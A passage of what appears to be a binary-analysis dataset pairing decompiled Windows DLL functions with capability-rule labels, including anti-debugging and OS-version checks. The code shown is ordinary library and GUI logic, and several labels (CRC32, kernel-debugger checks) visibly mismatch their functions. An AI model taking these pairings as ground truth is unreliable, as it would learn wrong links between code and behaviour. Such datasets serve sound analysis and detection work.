[(*(iVar2 + 1U + arg1) & 0xf) << 2 | *(iVar2 + 2 + arg1) >> 6];\n                pcVar5[3] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                            [*(iVar2 + 2 + arg1) & 0x3f];\n                pcVar5 = pcVar5 + 4;\n                uVar6 = *arg2;\n            } while (iVar2 + 3U < uVar6 - 2);\n        }\n        uVar8 = uVar7;\n        if (uVar8 < uVar6) {\n            *pcVar5 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[*(uVar7 + arg1) >> 2];\n            uVar7 = (*(uVar7 + arg1) & 3) * 0x10;\n            if (uVar8 == *arg2 - 1) {\n                pcVar5[1] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[uVar7];\n                cVar3 = '=';\n            }\n            else {\n                pcVar5[1] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                            [*(uVar8 + 1 + arg1) >> 4 | uVar7];\n                cVar3 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n                        [(*(uVar8 + 1 + arg1) & 0xf) * 4];\n            }\n            pcVar5[2] = cVar3;\n            pcVar5[3] = '=';\n            pcVar5 = pcVar5 + 4;\n        }\n        *arg2 = pcVar5 - pcVar4;\n        return pcVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 662
    },
    "1800972e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\ncode ** fcn.1800972ec(code **arg1, ulong arg2)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    code **ppcVar7;\n    uchar auStack64 [40];\n    \n    *arg1 = vtable.Concurrency::details::SchedulerBase.0;\n    fcn.1800a00bc(arg1 + 1, arg2);\n    *(arg1 + 9) = 0;\n    arg1[10] = NULL;\n    arg1[0xb] = NULL;\n    *(arg1 + 0xc) = 0;\n    arg1[0xd] = NULL;\n    arg1[0xe] = NULL;\n    *(arg1 + 0xf) = 0;\n    arg1[0x10] = NULL;\n    arg1[0x11] = NULL;\n    *(arg1 + 0x12) = 0;\n    arg1[0x13] = NULL;\n    fcn.1800971a8(arg1 + 0x16, 0, 0x100, 0x40);\n    arg1[0x27] = NULL;\n    arg1[0x28] = NULL;\n    fcn.180090e24(arg1 + 0x29);\n    fcn.1800971a8(arg1 + 0x2a, 0, 0x100, 0x7fffffff);\n    fcn.180090e04(arg1 + 0x3a);\n    arg1[0x3f] = NULL;\n    fcn.180090e24(arg1 + 0x40);\n    arg1[0x41] = NULL;\n    arg1[0x42] = arg1 + 0x41;\n    *(arg1 + 0x43) = 0;\n    *(arg1 + 0x44) = 0xffffffff;\n    *(arg1 + 0x224) = 0xffffffff;\n    *(arg1 + 0x45) = 0;\n    *(arg1 + 0x22c) = 0;\n    *(arg1 + 0x46) = 0;\n    arg1[0x47] = 0x1001;\n    pcVar6 = fcn.18008ff14(0x8008);\n    arg1[0x48] = pcVar6;\n    fcn.1800ae290(pcVar6, 0, *(arg1 + 0x47) << 3);\n    arg1[0x49] = 0x1001;\n    pcVar6 = fcn.18008ff14(0x8008);\n    arg1[0x4a] = pcVar6;\n    fcn.1800ae290(pcVar6, 0, *(arg1 + 0x49) << 3);\n    *(arg1 + 0x4b) = 0xffffffff;\n    *(arg1 + 0x25c) = 0;\n    *(arg1 + 0x4d) = 0;\n    *(arg1 + 0x26c) = 0;\n    *(arg1 + 0x4e) = 1;\n    *(arg1 + 0x274) = 0;\n    *(arg1 + 0x4f) = 0;\n    *(arg1 + 0x27c) = 0;\n    *(arg1 + 0x50) = 0;\n    arg1[0x51] = NULL;\n    arg1[0x52] = NULL;\n    *(arg1 + 0x54) = 0;\n    *(arg1 + 0x55) = 0;\n    *(arg1 + 0x2ac) = 0;\n    *(arg1 + 0x56) = 0;\n    *(arg1 + 0x2b4) = 0;\n    arg1[0x58] = NULL;\n    *(arg1 + 0x5c) = 0;\n    (**0x1800de358)(arg1 + 0x5e);\n    (**0x1800de358)(arg1 + 0x60);\n    (**0x1800de358)(arg1 + 0x62);\n    (**0x1800de358)(arg1 + 100);\n    arg1[0x1f] = arg1;\n    uVar2 = fcn.1800a0220(arg2, 0);\n    *(arg1 + 2) = uVar2;\n    uVar1 = fcn.1800a0220(arg2, 4);\n    *(arg1 + 3) = uVar1;\n    uVar2 = fcn.1800a0220(arg2, 7);\n    *(arg1 + 0x14) = uVar2;\n    uVar3 = fcn.1800a0220(arg2, 1);\n    iVar4 = fcn.180094c40();\n    if (uVar3 < iVar4 << 2) {\n        iVar4 = fcn.180094c40();\n        iVar4 = iVar4 << 2;\n    }\n    else {\n        iVar4 = fcn.1800a0220(arg2, 1);\n    }\n    *(arg1 + 700) = iVar4;\n    uVar2 = fcn.180091f40();\n    *(arg1 + 4) = uVar2;\n    pcVar6 = fcn.180091a60(0);\n    arg1[0x59] = pcVar6;\n    iVar4 = (**0x1800de2f0)(arg1 + 0x5a, pcVar6, 0x18009ba24, arg1, 0xffffffff, 0);\n    if (iVar4 == 0) {\n        uVar5 = (**0x1800de400)();\n        uVar3 = uVar5 & 0xffff | 0x80070000;\n        if (uVar5 < 1) {\n            uVar3 = uVar5;\n        }\n        fcn.1800925a8(auStack64, uVar3);\n        fcn.1800add8c(auStack64, 0x18011f130);\n        pcVar6 = swi(3);\n        ppcVar7 = (*pcVar6)();\n        return ppcVar7;\n    }\n    iVar4 = fcn.180094c38();\n    if (iVar4 < 3) {\n        iVar4 = fcn.180091abc(arg1 + 0x5b, 0, 0x18009ba1c, arg1, 0x7fffffff, 0x7fffffff, 0);\n        if (iVar4 == 0) {\n            uVar5 = (**0x1800de400)();\n            uVar3 = uVar5 & 0xffff | 0x80070000;\n            if (uVar5 < 1) {\n                uVar3 = uVar5;\n            }\n            fcn.1800925a8(auStack64, uVar3);\n            fcn.1800add8c(auStack64, 0x18011f130);\n            pcVar6 = swi(3);\n            ppcVar7 = (*pcVar6)();\n            return ppcVar7;\n        }\n    }\n    else {\n        pcVar6 = fcn.1800921ec(0x7fffffff, 0x18009ba14, arg1);\n        arg1[0x5b] = pcVar6;\n        if (pcVar6 == NULL) {\n            uVar5 = (**0x1800de400)();\n            uVar3 = uVar5 & 0xffff | 0x80070000;\n            if (uVar5 < 1) {\n                uVar3 = uVar5;\n            }\n            fcn.1800925a8(auStack64, uVar3);\n            fcn.1800add8c(auStack64, 0x18011f130);\n            pcVar6 = swi(3);\n            ppcVar7 = (*pcVar6)();\n            return ppcVar7;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1815
    },
    "18000250": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint * fcn.180002500(int64_t arg1, uint *arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    bool bVar6;\n    bool bVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uStack96;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack64;\n    unkbyte7 Stack63;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    ulong uStack32;\n    uint *puStack24;\n    \n    uStack32 = 0xfffffffffffffffe;\n    puStack24 = arg2;\n    iVar10 = *(arg1 + 8);\n    if (iVar10 == 0) {\n        uStack48 = *0x180101910;\n        uStack44 = *0x180101914;\n        uStack40 = *0x180101918;\n        uStack36 = *0x18010191c;\n        uStack64 = 0;\n        puVar8 = &uStack64;\n        bVar7 = true;\n        bVar6 = false;\n    }\n    else {\n        iVar9 = *(iVar10 + 0x28);\n        if (iVar9 == 0) {\n            iVar9 = iVar10 + 0x30;\n        }\n        uStack80 = *0x180101910;\n        uStack76 = *0x180101914;\n        uStack72 = *0x180101918;\n        uStack68 = *0x18010191c;\n        uStack96._0_1_ = 0;\n        iVar10 = -1;\n        do {\n            iVar10 = iVar10 + 1;\n        } while (*(iVar9 + iVar10) != '\\0');\n        fcn.180011120(&uStack96, iVar9, iVar10);\n        puVar8 = &uStack96;\n        bVar7 = false;\n        bVar6 = true;\n    }\n    uVar2 = puVar8[1];\n    uVar3 = puVar8[2];\n    uVar4 = puVar8[3];\n    *arg2 = *puVar8;\n    arg2[1] = uVar2;\n    arg2[2] = uVar3;\n    arg2[3] = uVar4;\n    uVar2 = puVar8[5];\n    uVar3 = puVar8[6];\n    uVar4 = puVar8[7];\n    arg2[4] = puVar8[4];\n    arg2[5] = uVar2;\n    arg2[6] = uVar3;\n    arg2[7] = uVar4;\n    *(puVar8 + 4) = 0;\n    *(puVar8 + 6) = 0xf;\n    *puVar8 = 0;\n    if (bVar6) {\n        if (0xf < CONCAT44(uStack68, uStack72)) {\n            iVar9 = CONCAT71(uStack96._1_7_, uStack96);\n            iVar10 = iVar9;\n            if ((0xfff < CONCAT44(uStack68, uStack72) + 1) && (iVar10 = *(iVar9 + -8),  0x1f < (iVar9 - iVar10) - 8U))\n            goto code_r0x000180002650;\n            fcn.18008fb24(iVar10);\n        }\n    }\n    if ((bVar7) && (uVar5 = CONCAT44(uStack36, uStack40),  0xf < uVar5)) {\n        iVar9 = CONCAT71(Stack63, uStack64);\n        iVar10 = iVar9;\n        if (0xfff < uVar5 + 1) {\n            iVar10 = *(iVar9 + -8);\n            if (0x1f < (iVar9 - iVar10) - 8U) {\n                fcn.1800b3528(iVar10, uVar5 + 0x28);\ncode_r0x000180002650:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                puVar8 = (*pcVar1)();\n                return puVar8;\n            }\n        }\n        fcn.18008fb24(iVar10);\n    }\n    return arg2;\n}\n",
        "token_count": 989
    },
    "18001c52": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.18001c520(void)\n\n{\n    int32_t iVar1;\n    uchar auStack72 [32];\n    uint uStack40;\n    ulong uStack36;\n    uint uStack28;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack72;\n    uStack40 = 0x10;\n    uStack36 = 0;\n    uStack28 = 0;\n    iVar1 = (**0x1800de5e0)(0x42, 0x10, &uStack40, 0);\n    if (iVar1 != 0) {\n        fcn.18008fb00(uStack24 ^ auStack72);\n        return;\n    }\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 178
    },
    "18001cf2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_bp_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001cf20(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uchar auVar1 [16];\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    ulong var_10h;\n    ulong var_bp_20h;\n    ulong var_30h;\n    ulong var_40h;\n    ulong var_50h;\n    ulong var_58h;\n    ulong var_60h;\n    ulong var_260h;\n    uchar auStack952 [32];\n    ulong uStack920;\n    ulong uStack912;\n    int32_t *piStack904;\n    uint32_t *puStack896;\n    uint *puStack888;\n    ulong uStack872;\n    int32_t iStack864;\n    int32_t iStack860;\n    uchar auStack856 [8];\n    ulong uStack848;\n    uint32_t uStack840;\n    int32_t iStack836;\n    int32_t iStack832;\n    int32_t iStack828;\n    uint32_t uStack824;\n    int32_t iStack820;\n    int32_t iStack816;\n    int32_t iStack812;\n    uint32_t uStack808;\n    int32_t iStack804;\n    int32_t iStack800;\n    int32_t iStack796;\n    uint32_t uStack792;\n    int32_t iStack788;\n    int32_t iStack784;\n    int32_t iStack780;\n    uint uStack776;\n    uint32_t uStack772;\n    uchar auStack768 [16];\n    uchar auStack752 [16];\n    uchar auStack736 [16];\n    uchar auStack720 [16];\n    uchar auStack696 [16];\n    uchar auStack680 [16];\n    uchar auStack664 [16];\n    uchar auStack648 [16];\n    uchar auStack632 [16];\n    ulong uStack616;\n    uint uStack608;\n    uchar auStack600 [464];\n    ulong var_80h;\n    ulong var_bp_70h;\n    ulong var_60h_2;\n    uint64_t var_50h_2;\n    ulong var_48h;\n    ulong var_bp_38h;\n    ulong var_bp_28h;\n    ulong var_18h;\n    \n    uStack848 = auStack856;\n    var_50h_2 = *0x180123080 ^ auStack952;\n    uStack840 = 0;\n    iStack836 = 0;\n    iStack832 = 0;\n    iStack828 = 0;\n    fcn.1800ae290(auStack600, 0, 0x200);\n    uVar6 = (**0x1800de7f0)(arg1, 0xf2, 0, 0);\n    _auStack856 = CONCAT88(uStack848, uVar6);\n    uVar6 = (**0x1800de7f0)(arg1, 0x129, 0, 0);\n    uStack792 = uVar6;\n    iStack788 = uVar6 >> 0x20;\n    uVar2 = (**0x1800de7a0)(arg1, 0xfffffff0);\n    auStack696 = extraout_XMM0 & 0x0;\n    uStack616 = 0;\n    uStack608 = 0;\n    iVar7 = 0;\n    uStack920 = CONCAT44(uStack920._4_4_, 0xd2);\n    uStack912 = auStack696;\n    auStack680 = auStack696;\n    auStack664 = auStack696;\n    auStack648 = auStack696;\n    auStack632 = auStack696;\n    iVar3 = (**0x1800de868)(arg3, arg2, arg4, var_30h);\n    if (-1 < iVar3) {\n        iVar7 = (**0x1800de0b8)(auStack696);\n    }\n    if (iVar7 == 0) {\n        (**0x1800de7f0)(arg1, 0x31, 0, 0);\n    }\n    uStack872 = (**0x1800de048)();\n    uVar9 = 0x20;\n    if ((uVar2 & 0x2000) != 0) {\n        uVar9 = 0x10;\n    }\n    if ((uVar2 & 0x300) == 0x300) {\n        uVar8 = 1;\n    }\n    else {\n        uVar8 = uVar2 >> 8 & 2;\n    }\n    if ((uVar2 & 0xc00) == 0xc00) {\n        uVar4 = 4;\n    }\n    else {\n        uVar4 = uVar2 >> 8 & 8;\n    }\n    uVar4 = (uStack792 & 2) << 0x13 | uVar4;\n    uVar9 = uVar9 | uVar8 | uVar4;\n    if ((uVar2 & 0x2c00) == 0) {\n        uVar9 = 0x24;\n        if ((uVar2 & 0x2000) != 0) {\n            uVar9 = 0x14;\n        }\n        uVar9 = uVar9 | uVar4 | uVar8;\n    }\n    (**0x1800de5d0)(arg1, &uStack840);\n    (**0x1800de5f0)(arg1, auStack600);\n    piStack904 = &iStack864;\n    uStack912 = CONCAT44(uStack912._4_4_, 2);\n    uStack920 = NULL;\n    iStack864 = 0xd;\n    iStack860 = 0xd;\n    (**0x1800de860)(arg3, arg2, arg4, var_30h);\n    uStack912 = &uStack808;\n    uStack920 = &uStack840;\n    uStack808 = uStack840;\n    iStack804 = iStack836;\n    iStack800 = iStack832;\n    iStack796 = iStack828;\n    (**0x1800de870)(arg3, arg2, arg4, var_30h);\n    uStack824 = uStack840;\n    iStack820 = iStack836;\n    if ((uVar9 & 0x20) != 0) {\n        iStack820 = ((iStack796 - iStack804) - iStack860) / 2 + iStack836;\n    }\n    iStack812 = iStack820 + iStack860;\n    iStack816 = uStack840 + iStack864;\n    uStack808 = iStack816 + 3;\n    (**0x1800de8a0)(arg1, arg2, &uStack840);\n    uStack920 = &uStack824;\n    uStack912 = NULL;\n    (**0x1800de858)(arg3, arg2, arg4, var_30h);\n    auStack752 = extraout_XMM0_00 & 0x0;\n    uStack776 = 0x48;\n    uStack772 = 1;\n    uVar5 = *0x180123d04;\n    if ((uVar2 >> 0x1b & 1) != 0) {\n        uVar5 = *0x180123d0c;\n    }\n    auStack768 = CONCAT124(SUB1612(auStack752 >> 0x20, 0), uVar5);\n    puStack888 = &uStack776;\n    puStack896 = &uStack808;\n    uStack920 = auStack600;\n    piStack904 = piStack904 & 0xffffffff00000000 | uVar9;\n    uStack912._0_4_ = 0xffffffff;\n    auStack736 = auStack752;\n    auStack720 = auStack752;\n    (**0x1800de8a8)(arg3, arg2, arg4, var_30h);\n    if (((_auStack856 & 0x8) != 0x0) && ((uStack792 & 1) == 0)) {\n        puStack888 = &uStack776;\n        uStack772 = uStack772 | 0x200;\n        puStack896 = &uStack792;\n        uStack792 = uStack808;\n        iStack788 = iStack804;\n        iStack784 = iStack800;\n        iStack780 = iStack796;\n        piStack904 = piStack904 & 0xffffffff00000000 | uVar9 | 0x400;\n        uStack920 = auStack600;\n        uStack912._0_4_ = 0xffffffff;\n        (**0x1800de8a8)(arg3, arg2, arg4, var_30h);\n        auVar1 = CONCAT412(iStack780, CONCAT48(iStack784, CONCAT44(iStack788, uStack792)));\n        _auStack856 = CONCAT124(SUB1612(auVar1 >> 0x20, 0), uStack792 - 1);\n        _auStack856 = CONCAT412(iStack780 + 1, CONCAT48(iStack784 + 1, auStack856));\n        (**0x1800de810)(SUB168(auVar1 >> 0x40, 0), arg2, auStack856);\n    }\n    if (iVar7 != 0) {\n        (**0x1800de0a8)(iVar7);\n    }\n    (**0x1800de048)(arg2, uStack872);\n    fcn.18008fb00(var_50h_2 ^ auStack952);\n    return;\n}\n",
        "token_count": 2217
    },
    "18001d74": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001d740(ulong arg1, ulong arg2, ulong *arg3)\n\n{\n    uint8_t uVar1;\n    uint8_t extraout_var;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    char cVar9;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    ulong var_10h;\n    ulong var_bp_20h;\n    ulong var_30h;\n    ulong var_40h;\n    ulong var_bp_50h;\n    ulong var_bp_58h;\n    ulong var_60h_2;\n    ulong var_260h;\n    uchar auStack952 [32];\n    ulong uStack920;\n    ulong uStack912;\n    int32_t iStack904;\n    int32_t *piStack896;\n    uint *puStack888;\n    uint32_t uStack872;\n    ulong *puStack864;\n    ulong uStack856;\n    ulong uStack848;\n    int32_t iStack840;\n    int32_t iStack836;\n    int32_t iStack832;\n    uint32_t uStack828;\n    int32_t iStack824;\n    int32_t iStack820;\n    int32_t iStack816;\n    uint32_t uStack812;\n    int32_t iStack808;\n    int32_t iStack804;\n    int32_t iStack800;\n    uint32_t uStack796;\n    uchar auStack792 [8];\n    int32_t iStack784;\n    uint32_t uStack780;\n    uint uStack776;\n    uint uStack772;\n    uchar auStack768 [16];\n    uchar auStack752 [16];\n    uchar auStack736 [16];\n    uchar auStack720 [16];\n    uint uStack696;\n    uint uStack692;\n    uint uStack688;\n    uint uStack684;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    ulong uStack616;\n    uint uStack608;\n    int16_t aiStack600 [232];\n    ulong var_80h;\n    ulong var_bp_70h;\n    ulong var_60h;\n    uint64_t uStack88;\n    ulong var_48h;\n    ulong var_bp_38h;\n    ulong var_bp_28h;\n    ulong var_18h;\n    \n    uStack88 = *0x180123080 ^ auStack952;\n    puStack864 = arg3;\n    (**0x1800de7a0)(arg1, 0xfffffff0);\n    _auStack792 = extraout_XMM0 & 0x0;\n    uVar1 = extraout_var >> 3 & 1;\n    uStack872 = uVar1;\n    cVar9 = uVar1 + 1;\n    (**0x1800de5d0)(arg1, auStack792);\n    iVar5 = 0;\n    uStack616 = 0;\n    uStack608 = 0;\n    iStack840 = auStack792._0_4_;\n    iStack836 = auStack792._4_4_;\n    iStack832 = iStack784;\n    uStack828 = uStack780;\n    iStack824 = auStack792._0_4_;\n    iStack820 = auStack792._4_4_;\n    iStack816 = iStack784;\n    uStack812 = uStack780;\n    uStack920 = CONCAT44(uStack920._4_4_, 0xd2);\n    uStack696 = 0;\n    uStack692 = 0;\n    uStack688 = 0;\n    uStack684 = 0;\n    uStack680 = 0;\n    uStack676 = 0;\n    uStack672 = 0;\n    uStack668 = 0;\n    uStack664 = 0;\n    uStack660 = 0;\n    uStack656 = 0;\n    uStack652 = 0;\n    uStack648 = 0;\n    uStack644 = 0;\n    uStack640 = 0;\n    uStack636 = 0;\n    uStack632 = 0;\n    uStack628 = 0;\n    uStack624 = 0;\n    uStack620 = 0;\n    uStack912 = &uStack696;\n    iVar2 = (**0x1800de868)(*arg3, arg2, 4, cVar9);\n    if (-1 < iVar2) {\n        iVar5 = (**0x1800de0b8)(&uStack696);\n    }\n    if (iVar5 == 0) {\n        (**0x1800de7f0)(arg1, 0x31, 0, 0);\n    }\n    uStack856 = (**0x1800de048)(arg2);\n    fcn.1800ae290(aiStack600, 0, 0x200);\n    (**0x1800de5f0)(arg1, aiStack600, 0x100);\n    uVar3 = (**0x1800de800)(arg1, 0xfffffff0);\n    uStack848 = 0;\n    if (aiStack600[0] == 0) {\n        (**0x1800de060)(arg2, 0x1800f48f4, 1, &uStack848);\n        iStack820 = iStack820 + uStack848._4_4_ / 2;\n    }\n    else {\n        iVar8 = -1;\n        do {\n            iVar8 = iVar8 + 1;\n        } while (aiStack600[iVar8] != 0);\n        (**0x1800de060)(arg2);\n        if ((uVar3 & 0x300) == 0x300) {\n            iVar2 = ((iStack784 - uStack848) - auStack792._0_4_) / 2;\n        }\n        else {\n            iVar2 = 7;\n        }\n        iStack840 = iStack840 + iVar2;\n        iStack820 = iStack820 + uStack848._4_4_ / 2;\n        uStack828 = iStack836 + uStack848._4_4_;\n        iStack832 = uStack848 + 4 + iStack840;\n        uStack920 = uStack920 & 0xffffffff00000000 | uStack828;\n        (**0x1800de098)(arg2);\n    }\n    uStack912 = &iStack808;\n    uStack920 = &iStack824;\n    iStack808 = iStack824;\n    iStack804 = iStack820;\n    iStack800 = iStack816;\n    uStack796 = uStack812;\n    (**0x1800de870)(*puStack864, arg2, 4, cVar9);\n    uStack920 = uStack920 & 0xffffffff00000000 | uStack796;\n    (**0x1800de098)(arg2, iStack808, iStack804, iStack800);\n    uVar7 = *0x180123d68;\n    iVar2 = iStack824;\n    iVar10 = iStack820;\n    iVar11 = iStack816;\n    uVar12 = uStack812;\n    uVar6 = (**0x1800de050)(5);\n    uVar6 = (**0x1800de048)(arg2, uVar6);\n    uVar7 = (**0x1800de048)(arg2, uVar7);\n    iStack904 = 0;\n    uStack912 = uStack912 & 0xffffffff00000000;\n    uStack920 = uStack920 & 0xffffffff00000000 | uVar12;\n    (**0x1800de0c0)(SUB128(CONCAT48(iVar11, CONCAT44(iVar10, iVar2)) >> 0x20, 0), \n                    SUB168(CONCAT412(uVar12, CONCAT48(iVar11, CONCAT44(iVar10, iVar2))) >> 0x40, 0), arg2, iVar2, iVar10\n                    , iVar11);\n    (**0x1800de048)(arg2, uVar6);\n    (**0x1800de048)(arg2, uVar7);\n    (**0x1800de088)(arg2, 0);\n    if (aiStack600[0] != 0) {\n        iStack832 = iStack832 + -2;\n        auStack752 = extraout_XMM0_00 & 0x0;\n        iStack840 = iStack840 + 2;\n        uVar4 = *0x180123d04;\n        if (uStack872 != '\\0') {\n            uVar4 = *0x180123d0c;\n        }\n        auStack768 = CONCAT124(SUB1612(auStack752 >> 0x20, 0), uVar4);\n        puStack888 = &uStack776;\n        uStack776 = 0x48;\n        iStack904 = ((uVar3 & 0x300) == 0x300) + 0x20;\n        piStack896 = &iStack840;\n        uStack772 = 1;\n        uStack920 = aiStack600;\n        uStack912 = CONCAT44(uStack912._4_4_, 0xffffffff);\n        auStack736 = auStack752;\n        auStack720 = auStack752;\n        (**0x1800de8a8)(*puStack864, arg2, 4, cVar9);\n    }\n    if (iVar5 != 0) {\n        (**0x1800de0a8)(iVar5);\n    }\n    (**0x1800de048)(arg2, uStack856);\n    fcn.18008fb00(uStack88 ^ auStack952);\n    return;\n}\n",
        "token_count": 2277
    },
    "18001fc6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18001fc60(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    \n    uVar2 = (**0x1800de800)(arg2, 0xfffffff0);\n    if ((uVar2 >> 0xf & 1) == 0) {\n        iVar1 = (**0x1800de820)(arg2);\n        if (iVar1 != 0) {\n            (**0x1800de068)(arg1, *0x180123d04);\n            (**0x1800de0a0)(arg1, *0x180123cf4);\n            return *0x180123d28;\n        }\n    }\n    (**0x1800de068)(arg1, *0x180123d04);\n    (**0x1800de0a0)(arg1, *0x180123cf0);\n    return *0x180123d20;\n}\n",
        "token_count": 210
    },
    "18006ee4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18006ee48(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = vtable.std::num_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 330
    },
    "18006ef0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18006ef0c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **ppcVar2;\n    int64_t arg2_00;\n    bool bVar3;\n    uchar auStack112 [104];\n    \n    bVar3 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar2 = fcn.18008fb2c(0x10);\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack112, arg2_00);\n            bVar3 = true;\n            *(ppcVar2 + 1) = 0;\n            *ppcVar2 = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n        }\n        *arg1 = ppcVar2;\n        if (bVar3) {\n            fcn.1800023f0(auStack112);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 331
    },
    "18006efd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.18006efd0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code **arg1_00;\n    int64_t arg2_00;\n    bool bVar2;\n    uchar auStack128 [104];\n    \n    bVar2 = false;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        arg1_00 = fcn.18008fb2c(0x30);\n        if (arg1_00 == NULL) {\n            arg1_00 = NULL;\n        }\n        else {\n            iVar1 = *(arg2 + 8);\n            if (iVar1 == 0) {\n                arg2_00 = 0x1800f454f;\n            }\n            else {\n                arg2_00 = *(iVar1 + 0x28);\n                if (arg2_00 == 0) {\n                    arg2_00 = iVar1 + 0x30;\n                }\n            }\n            fcn.180002370(auStack128, arg2_00);\n            bVar2 = true;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = vtable.std::numpunct_char_.0;\n            fcn.1800712a4(arg1_00);\n        }\n        *arg1 = arg1_00;\n        if (bVar2) {\n            fcn.1800023f0(auStack128);\n        }\n    }\n    return 4;\n}\n",
        "token_count": 329
    },
    "1800752c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
